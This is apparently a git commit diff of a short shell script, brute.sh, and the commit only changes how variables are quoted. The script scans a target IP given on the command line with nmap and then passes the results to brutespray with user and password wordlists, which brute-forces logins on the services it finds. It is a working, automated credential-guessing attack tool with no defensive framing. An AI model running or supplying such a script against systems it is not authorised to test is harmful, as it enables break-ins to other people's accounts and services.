d9c6bd26dfcd1757934d01e1a46a78dd684493bb
gaidardzhiev <1v4n@protonmail.com>
2025-09-30 08:09:03 +0000

    Tue Sep 30 08:09:02 AM UTC 2025

--- brute.sh
+++ brute.sh
@@ -1,26 +1,26 @@
 #!/bin/sh
 
-export IP="$1"
+export IP="${1}"
 export FILE="scan.gnmap"
 export USR="/usr/share/brutespray/wordlist/user.txt"
 export PASS="/usr/share/brutespray/wordlist/pass.txt"
 
 
-[ -z "$IP" ] && {
-	printf "usage: "$0" <target>\n";
+[ -z "${IP}" ] && {
+	printf "usage: "${0}" <target>\n";
 	exit 1;
 }
 
 fscan() {
-	nmap -sS -sV "$IP" -vv -n -oA "$FILE"
+	nmap -sS -sV "${IP}" -vv -n -oA "${FILE}"
 	return 0
 }
 
 fspray() {
 	brutespray \
-		--file "$FILE" \
-		-U "$USR" \
-		-P "$PASS" \
+		--file "${FILE}" \
+		-U "${USR}" \
+		-P "${PASS}" \
 		--threads 5 \
 		--hosts 5
 	return 0
